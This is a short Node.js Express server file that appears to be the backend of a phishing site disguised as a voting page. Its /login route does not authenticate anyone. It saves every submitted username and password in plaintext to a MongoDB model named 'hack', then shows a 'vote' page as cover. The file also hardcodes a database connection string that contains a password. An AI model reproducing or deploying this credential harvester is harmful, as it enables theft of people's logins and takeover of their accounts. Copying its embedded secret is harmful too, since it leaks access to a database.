const express = require('express');
const app = express();
const path = require('path');
const mongoose = require('mongoose');

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use("/css",express.static("src"))

// View engine setup
app.set("view engine", "ejs");
app.use(express.static(path.join(__dirname, 'public')));

// MongoDB connection
const db = "mongodb+srv://naveen20181189:kingskidspassword123@cluster0.sgys0.mongodb.net/";
mongoose.connect(db, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => {
        console.log("MongoDB is connected successfully");
    })
    .catch((err) => {
        console.log("MongoDB error:", err);
    });

// Mongoose schema and model
const creditSchema = new mongoose.Schema({
    username: String,
    password: String
});
const credit = mongoose.model('hack', creditSchema);

// Routes
app.get("/", (req, res) => {
    res.render("matter");
});
app.get("/index", (req, res) => {
    res.render("index");
});

app.get("/vote", (req, res) => {
    res.render("vote");
});
app.get("/thanks", (req, res) => {
    res.render("thanks");
});

app.post('/login', async (req, res) => {
    try {
        // Log the received username and password
        const { username, password } = req.body; // Destructure to get username and password
        
        
        // Create a new user in the database
        let user = await credit.create({
            username,
            password
        });

        // Send a success response (you can customize this)
        res.render("vote")
    } catch (error) {
        console.error('give correct credentials:', error);
        res.status(500).send('Error saving form data');
    }
});

// Start server
app.listen(8000, () => {
    console.log("Server is running successfully on port 8000");
});
